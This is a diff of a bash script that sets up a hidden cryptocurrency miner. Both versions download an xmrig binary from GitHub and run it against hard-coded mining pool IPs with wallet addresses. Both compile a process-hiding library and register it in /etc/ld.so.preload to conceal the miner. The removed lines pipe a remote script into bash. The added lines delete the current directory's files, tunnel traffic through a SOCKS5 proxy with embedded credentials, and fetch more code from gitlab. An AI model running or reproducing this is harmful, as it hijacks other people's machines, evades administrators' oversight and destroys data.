@@ -1,15 +1,58 @@
-#!/bin/bash
-apt-get update ; apt-get install sudo -y
-apt install unzip
-curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
-apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
-wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
-chmod 777 vrl
-./vrl -a rx/0 --donate-level 1 -o 209.38.198.169:8080 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4aNeCaYixqvQ2Wh74Tqw5U1dcubDGpRz2y61rzdjMibQM5 -p xdev -t $(nproc --all) > /dev/null 2>&1 &
-curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash 
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl && chmod 777 vrl 
+
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 23.95.150.145:6114
+socks5_username = fteaizfs
+socks5_password = sgez2ll6ec4y
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./vrl -a rx/0 --donate-level 1 -o 104.248.8.194:80 -u N5iNHBM9T4h12k2FaNKEbK7bSSsR5Hw2n1xCyp5c97MfSowx3AN8iYWUxapEsiqKqWiZ5dtCs6Ar6G59GCMJVExjNKtH5yq -p $(echo $(shuf -i 1-15000 -n 1)-A) -t $(nproc --all) 
